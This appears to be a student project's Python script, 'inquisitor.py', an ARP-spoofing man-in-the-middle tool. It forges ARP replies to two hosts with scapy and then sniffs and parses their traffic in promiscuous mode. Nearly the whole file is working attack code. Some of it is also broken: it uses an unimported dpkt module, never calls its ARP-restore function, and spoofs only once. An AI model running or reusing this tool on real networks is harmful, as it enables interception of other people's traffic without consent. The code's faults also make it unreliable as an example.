# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: preina-g <preina-g@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/06/01 15:42:21 by preina-g          #+#    #+#              #
#    Updated: 2023/06/09 15:10:44 by preina-g         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import scapy.all as scapy
import argparse
import pcap
from dpkt.ethernet import Ethernet

def args_parser():
    parser = argparse.ArgumentParser(description='Inquisitor - Man In The Middle Attack')
    parser.add_argument('-sI', '--Srcip', type=str, help='Source IP address')
    parser.add_argument('-sM', '--Srcmac', type=str, help='Source MAC address')
    parser.add_argument('-dI', '--Dstip', type=str, help='Destination IP address')
    parser.add_argument('-dM', '--Dstmac', type=str, help='Destination MAC address')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    args = parser.parse_args()
    return args

def ARP_spoofing(srcip, srcmac, dstip, dstmac):
    """
    This function will send ARP packets to the target and the gateway to make them believe that we are the other one.
    """
    # create the ARP packet
    # op = 'is-at' to specify that we are sending a response
    packet = scapy.ARP(op="is-at", pdst=dstip, hwdst=dstmac, psrc=srcip)
    # send the packet
    # verbose = False to hide the output
    scapy.send(packet, verbose=False)
    if args_parser().verbose:
        atk_mac = scapy.ARP().hwsrc
        print("[+] Sent to {} from {} that is-at {}".format(dstip, srcip, atk_mac))
# Esta funcion es la que se encarga de enviar los paquetes ARP a la victima y al router para que piensen que somos el otro

def ARP_restore(dstip, dstmac, srcip, srcmac):
    """
    This finction restore the ARP table of the target and the gateway.
    """
    # create the ARP packet
    # op = 'is-at' to specify that we are sending a response
    packet = scapy.ARP(op="is-at", pdst=dstip, hwdst=dstmac, psrc=srcip, hwsrc=srcmac)
    # send the packet
    # verbose = False to hide the output
    scapy.send(packet, count=4,verbose=False)
    if args_parser().verbose:
        print("[+] Sent to {} from {} that is-at {}".format(dstip, srcip, srcmac))  
    
def sniff_packets():
    # sniff the packets using pcap module
    sniffer = pcap.pcap(name=None, promisc=True, immediate=True, timeout_ms=1000)

    # process the sniffed packets one by one
    for timestamp, raw_buff in sniffer:
        output = {}
        
        # parse the packet using dpkt module to get the Ethernet frame
        eth = Ethernet(raw_buff)
        output['eth'] = {'src': eth.src, 'dst': eth.dst, 'type': eth.type}

        # check if the packet is IP packet
        if not isinstance(eth.data, dpkt.ip.IP):
            print('Non IP Packet type not supported {}'.format(eth.data.__class__.__name__))
            continue
        # make a dictionary to store the parsed fields of IP packet
        ip = eth.data

        # store all the parsed fields of IP packet in the dictionary
        # mf = more fragments, df = don't fragment
        df = bool(ip.off & dpkt.ip.IP_DF)
        mf = bool(ip.off & dpkt.ip.IP_MF)
        # offset = offset value
        offset = ip.off & dpkt.ip.IP_OFFMASK

        # store the dictionary in the output list to print it later in csv file
        output['ip'] = {'src': ip.src, 'dst': ip.dst, 'ttl': ip.ttl, 'df': df, 'mf': mf, 'offset': offset}
        if args_parser().verbose:
            print(output)
    
def main():
    args = args_parser()
    if args.Srcip and args.Srcmac and args.Dstip and args.Dstmac:
        ARP_spoofing(args.Srcip, args.Srcmac, args.Dstip, args.Dstmac)
        ARP_spoofing(args.Dstip, args.Dstmac, args.Srcip, args.Srcmac)
        sniff_packets()
    else:
        print("\033[31m[-] Please specify all the arguments <IP-SRC> <MAC-SRC> <IP-DST> <MAC-DST>\033[0m")
        print("[?] python3 inquisitor.py -h --help for more informations")

if __name__ == "__main__":
    main()